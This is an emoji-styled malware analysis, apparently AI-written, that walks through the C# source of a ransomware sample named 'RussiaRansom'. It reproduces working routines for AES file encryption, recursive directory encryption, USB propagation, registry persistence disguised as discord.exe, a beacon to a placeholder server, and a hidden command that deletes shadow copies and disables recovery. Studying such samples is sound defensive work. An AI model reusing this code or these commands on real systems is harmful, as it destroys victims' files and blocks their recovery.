# Analyzing a C# Malware Code: A Deep Dive into RussiaRansom 🕵️‍♂️🔍

The provided C# code appears to be a malicious program, dubbed "RussiaRansom," designed to encrypt files, display ransom notes, and perform various harmful actions on a victim's system. Below, we’ll break down the key components of this code, illustrating each point with the relevant source code, and provide an analysis of its functionality. The article is structured to explain the code’s malicious behavior while adhering to the user’s request for an engaging format with emojis.

---

## 1. Overview of RussiaRansom 🦠

The program is a ransomware-like malware that encrypts files in specific directories, leaves ransom notes, and attempts to persist on the system. It uses AES encryption with a hardcoded password, copies itself to removable drives, disables system recovery features, and communicates with a remote server. Despite its threatening appearance, it includes a hint suggesting it might be a prank, as the decryption password is embedded in the code.

Here’s the entry point of the program, located in the `Main` method:

```csharp
private static void Main(string[] args)
{
    try
    {
        ShowWindow(Process.GetCurrentProcess().MainWindowHandle, 0);
        string text = "no";
        string text2 = "si";
        string text3 = "si";
        string text4 = "no";
        if (text2 == "no")
        {
            Program program = new Program();
            program.start();
        }
        else
        {
            if (!(text2 == "si"))
            {
                return;
            }
            while (text == "no")
            {
                if (NetworkInterface.GetIsNetworkAvailable())
                {
                    text = "si";
                    Program program = new Program();
                    program.start();
                }
                else if (text3 == "si" && text4 == "no")
                {
                    text4 = "si";
                    RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true);
                    registryKey.SetValue("discord", Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\discord.exe");
                    string keyName = "HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run";
                    string valueName = "discord";
                    if (Registry.GetValue(keyName, valueName, null) == null)
                    {
                        MessageBox.Show("Oops, the crack is outdated", "Error!", (MessageBoxButtons)0, (MessageBoxIcon)16);
                    }
                }
            }
        }
    }
    catch (Exception ex)
    {
        Console.WriteLine(ex.Message);
    }
}
```

**Analysis**:
- The `ShowWindow` call hides the console window, making the malware run silently.
- The logic uses several flags (`text`, `text2`, etc.) to determine execution flow. By default, `text2 = "si"`, so the program waits for a network connection before calling `start()`.
- If no network is available, it sets a registry key to ensure persistence by masquerading as "discord.exe" in the startup folder.

---

## 2. File Encryption with AES 🔒

The core malicious functionality is file encryption using the AES algorithm. The `AES_Encrypt` method encrypts data, and `EncryptFile` applies it to individual files.

```csharp
public byte[] AES_Encrypt(byte[] bytesToBeEncrypted, byte[] passwordBytes)
{
    byte[] result = null;
    byte[] salt = new byte[8] { 3, 4, 2, 6, 5, 1, 7, 8 };
    using (MemoryStream memoryStream = new MemoryStream())
    {
        using RijndaelManaged rijndaelManaged = new RijndaelManaged();
        rijndaelManaged.KeySize = 256;
        rijndaelManaged.BlockSize = 128;
        Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(passwordBytes, salt, 1000);
        rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(rijndaelManaged.KeySize / 8);
        rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(rijndaelManaged.BlockSize / 8);
        rijndaelManaged.Mode = CipherMode.CBC;
        using (CryptoStream cryptoStream = new CryptoStream(memoryStream, rijndaelManaged.CreateEncryptor(), CryptoStreamMode.Write))
        {
            cryptoStream.Write(bytesToBeEncrypted, 0, bytesToBeEncrypted.Length);
            cryptoStream.Close();
        }
        result = memoryStream.ToArray();
    }
    return result;
}

public void EncryptFile(string file, string password)
{
    try
    {
        byte[] bytesToBeEncrypted = File.ReadAllBytes(file);
        byte[] bytes = Encoding.UTF8.GetBytes(password);
        bytes = SHA256.Create().ComputeHash(bytes);
        byte[] bytes2 = AES_Encrypt(bytesToBeEncrypted, bytes);
        File.WriteAllBytes(file, bytes2);
        File.Move(file, file + ".russia");
        Console.WriteLine("encrypted: " + file + " >> " + file + ".russia");
        encryptedfiles = encryptedfiles + file + Environment.NewLine;
    }
    catch (Exception ex)
    {
        Console.WriteLine(ex.Message);
    }
}
```

**Analysis**:
- `AES_Encrypt` uses AES-256 in CBC mode with a fixed salt and a password-derived key via PBKDF2 (Rfc2898DeriveBytes).
- `EncryptFile` reads a file, encrypts its contents, and renames it with a `.russia` extension.
- The password is derived from a SHA-256 hash of the input password, which is later revealed as `neverlose2115` (decoded from base64 in the `start` method).
- The `encryptedfiles` string tracks encrypted files for inclusion in ransom notes.

---

## 3. Directory Traversal and Encryption 🌐

The `encryptDirectory` method recursively encrypts files in specified directories, skipping files with the `.russia` extension or named `README.txt`.

```csharp
public void encryptDirectory(string location, string password)
{
    try
    {
        string text = "si";
        string[] source = new string[1] { "//aqui_extensiones" };
        string[] files = Directory.GetFiles(location);
        string[] directories = Directory.GetDirectories(location);
        for (int i = 0; i < files.Length; i++)
        {
            string fileName = Path.GetFileName(files[i]);
            string extension = Path.GetExtension(files[i]);
            if (!(extension == ".russia") && !(fileName == "README.txt"))
            {
                if (text == "si")
                {
                    EncryptFile(files[i], password);
                }
                else if (source.Contains(extension))
                {
                    EncryptFile(files[i], password);
                }
            }
        }
        for (int i = 0; i < directories.Length; i++)
        {
            encryptDirectory(directories[i], password);
        }
    }
    catch (Exception ex)
    {
        Console.WriteLine(ex.Message);
    }
}
```

**Analysis**:
- The method targets all files in a directory (`text = "si"`) unless specific extensions are defined in `source`, which is currently a placeholder (`//aqui_extensiones`).
- It recursively processes subdirectories, ensuring widespread encryption.
- Files already encrypted (`.russia`) or ransom notes (`README.txt`) are skipped to avoid redundant processing.

---

## 4. Ransom Note Creation 📝

The `mensaje` and `messageCreator` methods create ransom notes (`README.txt`) in affected directories.

```csharp
public void mensaje(string location)
{
    try
    {
        nota_mostrar = "si";
        string[] contents = new string[1] { "All your files was enecrypted by RussiaRansom, you can guess the password for unlocking but it wont work.\r\nHeres proof :\r\nYour pc name : %COMPUTERNAME%\r\nYour ip : %PRIVATEIP%\r\nYour username : %USERNAME%\r\nThis is only a prank, password is easy\r\nHint : The best csgo hack [no spaces, no big letters, add 2115 to end]".Replace("%PERSONALID%", ID).Replace("%USERNAME%", Environment.UserName).Replace("%COMPUTERNAME%", Environment.MachineName)
            .Replace("%DATE%", DateTime.Now.ToString())
            .Replace("%PRIVATEIP%", GetLocalIPAddress())
            .Replace("%ENCRYPTEDFILES%", encryptedfiles) };
        string[] files = Directory.GetFiles(location);
        string[] directories = Directory.GetDirectories(location);
        for (int i = 0; i < directories.Length; i++)
        {
            messageCreator(directories[i]);
        }
        File.WriteAllLines(location + "\\README.txt", contents);
    }
    catch (Exception ex)
    {
        Console.WriteLine(ex.Message);
    }
}

public void messageCreator(string location)
{
    try
    {
        nota_mostrar = "si";
        string[] contents = new string[1] { "All your files was enecrypted by RussiaRansom, you can guess the password for unlocking but it wont work.\r\nHeres proof :\r\nYour pc name : %COMPUTERNAME%\r\nYour ip : %PRIVATEIP%\r\nYour username : %USERNAME%\r\nThis is only a prank, password is easy\r\nHint : The best csgo hack [no spaces, no big letters, add 2115 to end]".Replace("%PERSONALID%", ID).Replace("%USERNAME%", Environment.UserName).Replace("%COMPUTERNAME%", Environment.MachineName)
            .Replace("%DATE%", DateTime.Now.ToString())
            .Replace("%PRIVATEIP%", GetLocalIPAddress())
            .Replace("%ENCRYPTEDFILES%", encryptedfiles) };
        string[] directories = Directory.GetDirectories(location);
        File.WriteAllLines(location + "\\README.txt", contents);
    }
    catch (Exception ex)
    {
        Console.WriteLine(ex.Message);
    }
}
```

**Analysis**:
- The ransom note informs victims that their files are encrypted and provides system details (username, PC name, IP address).
- It includes a hint: “The best csgo hack [no spaces, no big letters, add 2115 to end],” pointing to the password `neverlose2115`.
- The note is placed in every targeted directory, ensuring visibility.
- The `nota_mostrar` flag controls whether the note is displayed to the user.

---

## 5. USB Propagation 📀

The `USB` method attempts to copy the malware to all available removable drives, naming it `ABREME.exe.exe`.

```csharp
public void USB()
{
    string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
    string location = Assembly.GetEntryAssembly().Location;
    string contents = "@echo off" + Environment.NewLine + "copy \"" + location + "\" A:\\ABREME.exe.exe" + Environment.NewLine + "copy \"" + location + "\" B:\\ABREME.exe.exe" + Environment.NewLine + "copy \"" + location + "\" D:\\ABREME.exe.exe" + Environment.NewLine + "copy \"" + location + "\" E:\\ABREME.exe.exe" + Environment.NewLine + "copy \"" + location + "\" F:\\ABREME.exe.exe" + Environment.NewLine + "copy \"" + location + "\" G:\\ABREME.exe.exe" + Environment.NewLine + "copy \"" + location + "\" H:\\ABREME.exe.exe" + Environment.NewLine + "copy \"" + location + "\" I:\\ABREME.exe.exe" + Environment.NewLine + "copy \"" + location + "\" J:\\ABREME.exe.exe" + Environment.NewLine + "copy \"" + location + "\" K:\\ABREME.exe.exe" + Environment.NewLine + "copy \"" + location + "\" L:\\ABREME.exe.exe" + Environment.NewLine + "copy \"" + location + "\" M:\\ABREME.exe.exe" + Environment.NewLine + "copy \"" + location + "\" N:\\ABREME.exe.exe" + Environment.NewLine + "copy \"" + location + "\" Ñ:\\ABREME.exe.exe" + Environment.NewLine + "copy \"" + location + "\" O:\\ABREME.exe.exe" + Environment.NewLine + "copy \"" + location + "\" P:\\ABREME.exe.exe" + Environment.NewLine + "copy \"" + location + "\" Q:\\ABREME.exe.exe" + Environment.NewLine + "copy \"" + location + "\" R:\\ABREME.exe.exe" + Environment.NewLine + "copy \"" + location + "\" S:\\ABREME.exe.exe" + Environment.NewLine + Environment.NewLine + "copy \"" + location + "\" T:\\ABREME.exe.exe" + Environment.NewLine + "copy \"" + location + "\" U:\\ABREME.exe.exe" + Environment.NewLine + "copy \"" + location + "\" V:\\ABREME.exe.exe" + Environment.NewLine + "copy \"" + location + "\" W:\\ABREME.exe.exe" + Environment.NewLine + "copy \"" + location + "\" X:\\ABREME.exe.exe" + Environment.NewLine + "copy \"" + location + "\" Y:\\ABREME.exe.exe" + Environment.NewLine + "copy \"" + location + "\" Z:\\ABREME.exe.exe" + Environment.NewLine + "exit";
    File.WriteAllText(folderPath + "\\usb_maker.bat", contents);
    ProcessStartInfo processStartInfo = new ProcessStartInfo();
    processStartInfo.FileName = folderPath + "\\usb_maker.bat";
    processStartInfo.WindowStyle = ProcessWindowStyle.Hidden;
    Process.Start(processStartInfo);
}
```

**Analysis**:
- The method creates a batch file (`usb_maker.bat`) that copies the executable to drives A: through Z:.
- The batch file runs silently (`WindowStyle.Hidden`), attempting to infect any connected USB drives.
- The filename `ABREME.exe.exe` (Spanish for “open me”) is designed to trick users into running the malware.

---

## 6. System Persistence and Anti-Recovery Measures 🛡️

The `inicio_void` method ensures the malware persists by copying itself to `%LocalAppData%\discord.exe` and adding a registry key for startup.

```csharp
public void inicio_void()
{
    string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
    string text = "";
    try
    {
        text = File.ReadAllText(folderPath + "\\uac_location");
    }
    catch (Exception ex)
    {
        Console.WriteLine(ex.Message);
    }
    RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true);
    registryKey.SetValue("discord", Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\discord.exe");
    if (text == "")
    {
        if (!File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\discord.exe"))
        {
            File.Copy(Application.ExecutablePath, Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\discord.exe", overwrite: true);
        }
    }
    else if (!File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\discord.exe"))
    {
        File.Copy(Application.ExecutablePath, Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\discord.exe", overwrite: true);
    }
    try
    {
        File.Delete(folderPath + "\\uac_location");
    }
    catch (Exception ex)
    {
        Console.WriteLine(ex.Message);
    }
}
```

The `borrar` method disables system recovery by deleting shadow copies and disabling recovery options.

```csharp
public void borrar()
{
    ProcessStartInfo processStartInfo = new ProcessStartInfo();
    processStartInfo.FileName = "cmd.exe";
    processStartInfo.WindowStyle = ProcessWindowStyle.Hidden;
    processStartInfo.Arguments = " /c vssadmin delete shadows /all /quiet & wmic shadowcopy delete & bcdedit /set {default} bootstatuspolicy ignoreallfailures & bcdedit /set {default} recoveryenabled no & wbadmin delete catalog -quiet";
    Process.Start(processStartInfo);
}
```

**Analysis**:
- `inicio_void` disguises the malware as `discord.exe`, a common application, to avoid suspicion.
- The registry key ensures the malware runs on system startup.
- `borrar` executes commands to delete Volume Shadow Copies, disable recovery boot options, and clear the Windows Backup catalog, making file recovery difficult.

---

## 7. Remote Communication 🌐

The `conectar` method communicates with a remote server to report infection details.

```csharp
public static void conectar()
{
    try
    {
        string text = "https://example.com/";
        Console.WriteLine("string enlace creado");
        Console.WriteLine("string informacion creado");
        string address = text + "data.php?info=" + ((Control)Program.text).Text;
        Console.WriteLine("strings fusionados");
        WebClient webClient = new WebClient();
        Console.WriteLine("webclient creado");
        webClient.Headers.Add("user-agent", "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.2; .NET CLR 1.0.3705;)");
        Console.WriteLine("webclient headers");
        Stream stream = webClient.OpenRead(text + "data.txt");
        Console.WriteLine("data");
        StreamReader streamReader = new StreamReader(stream);
        Console.WriteLine("reader");
        string text2 = streamReader.ReadToEnd();
        Console.WriteLine("s");
        stream.Close();
        Console.WriteLine("data close");
        streamReader.Close();
        Console.WriteLine("reader close");
        if (text2.Contains(ID))
        {
            Console.WriteLine("ID ya en el servidor");
            return;
        }
        string text3 = new WebClient().DownloadString(address);
        Console.WriteLine("enviado");
    }
    catch (Exception ex)
    {
        Console.WriteLine(ex.Message);
        conectar();
    }
}
```

**Analysis**:
- The method sends system information (ID, username, PC name, IP, etc.) to a server at `https://example.com/data.php`.
- It checks if the system’s unique ID is already registered on the server by reading `data.txt`.
- If an error occurs, it retries indefinitely, indicating persistent communication attempts.

---

## 8. Desktop Wallpaper Change 🎨

The `fondo` method changes the desktop wallpaper to a predefined image.

```csharp
public static void fondo()
{
    try
    {
        File.Copy(CenterScreen.GetBackgroud(), Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\fondo_antiguo.jpg", overwrite: true);
        random = CreateId(30);
        string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.MyPictures);
        if (File.Exists(folderPath + "\\image.jpg"))
        {
            SystemParametersInfo(20u, 0u, folderPath + "\\image.jpg", 3u);
            File.Delete(folderPath + "\\image.jpg");
        }
        else
        {
            File.WriteAllBytes(folderPath + "\\image" + random + ".jpg", Resources.wallpaper_jpg);
            SystemParametersInfo(20u, 0u, folderPath + "\\image" + random + ".jpg", 3u);
            File.Delete(folderPath + "\\image" + random + ".jpg");
        }
    }
    catch (Exception ex)
    {
        Console.WriteLine("ERRORRRRRRRRRRRRRRRR: " + ex.Message);
    }
}
```

**Analysis**:
- The original wallpaper is backed up as `fondo_antiguo.jpg`.
- A new wallpaper (`wallpaper_jpg` from resources) is set using `SystemParametersInfo`.
- The wallpaper file is deleted after being applied, likely to avoid detection.

---

## 9. Self-Destruction 💥

The `autodestruir` method deletes the malware’s executable and any related files.

```csharp
public void autodestruir()
{
    string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
    string location = Assembly.GetEntryAssembly().Location;
    string text = File.ReadAllText(folderPath + "\\uac_location");
    string fileNameWithoutExtension = Path.GetFileNameWithoutExtension(location);
    ProcessStartInfo processStartInfo = new ProcessStartInfo();
    processStartInfo.FileName = "cmd.exe";
    processStartInfo.WindowStyle = ProcessWindowStyle.Hidden;
    processStartInfo.Arguments = "/c del \"" + location + "\" /F /Q";
    Process.Start(processStartInfo);
    ProcessStartInfo processStartInfo2 = new ProcessStartInfo();
    processStartInfo2.FileName = "cmd.exe";
    processStartInfo2.WindowStyle = ProcessWindowStyle.Hidden;
    processStartInfo2.Arguments = "/c del \"" + text + "\" /F /Q";
    Process.Start(processStartInfo2);
}
```

**Analysis**:
- The method uses `cmd.exe` to delete the malware’s executable and a file specified in `uac_location`.
- The `/F /Q` flags force deletion quietly, reducing visibility.
- This self-destruction mechanism may be intended to evade detection after infection.

---

## 10. Critical Process Designation ⚠️

The `start` method marks the process as critical using `NtSetInformationProcess`.

```csharp
public void start()
{
    try
    {
        NtSetInformationProcess(Process.GetCurrentProcess().Handle, BreakOnTermination, ref isCritical, 4);
        // ... other code ...
        NtSetInformationProcess(Process.GetCurrentProcess().Handle, BreakOnTermination, ref notisCritical, 4);
    }
    catch (Exception ex)
    {
        Console.WriteLine(ex.Message);
    }
}
```

**Analysis**:
- Setting `isCritical = 1` makes the process critical, causing a system crash if terminated.
- Later, `notisCritical = 0` removes this designation, possibly after encryption is complete.
- This technique hinders attempts to stop the malware via Task Manager.

---

## Conclusion 🎯

The RussiaRansom code is a sophisticated yet flawed piece of malware. Its use of AES encryption, USB propagation, and anti-recovery measures demonstrates malicious intent, but the hardcoded password (`neverlose2115`) and prank-like ransom note suggest it may not be intended for serious harm. Key takeaways:
- **Encryption**: Uses AES-256 to encrypt files, but the password is easily recoverable.
- **Propagation**: Spreads via USB drives, increasing its reach.
- **Persistence**: Ensures startup via registry keys and masquerades as `discord.exe`.
- **Evasion**: Hides its window, deletes recovery options, and attempts self-destruction.
- **Communication**: Reports infections to a remote server, though the URL is a placeholder.

This analysis highlights the importance of understanding malware techniques to develop effective defenses. Always maintain backups and use antivirus software to protect against such threats! 🛡️